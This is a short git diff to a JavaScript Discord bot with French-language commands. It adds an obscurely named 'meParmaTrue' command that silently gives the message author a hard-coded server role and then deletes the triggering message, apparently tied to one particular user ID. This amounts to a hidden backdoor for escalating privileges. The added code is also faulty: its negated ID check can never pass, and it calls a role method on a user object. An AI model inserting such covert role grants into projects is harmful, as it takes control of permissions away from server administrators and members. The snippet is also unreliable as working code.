@@ -77,6 +77,13 @@ message.channel.send(`${message.author} Mmm, les Carottes 🥕`)
 	    }
     }
 
+	if(message.content === prefix + "meParmaTrue"){
+		if(!message.author.id == '379676244398309386'){
+			let role = message.guild.roles.cache.find(r => r.id === "692709226878861382");
+			message.author.roles.add(role);
+		}
+		message.delete(10)
+	}
 	if(message.content === prefix + "oh"){
 		        if(inChannel == true){
 		message.channel.send(`${message.author} ❗🛑, Action impossible pour cause, le bot est connecté à un channel veuillez le déconnecter pour utiliser cette commande. 😥`)
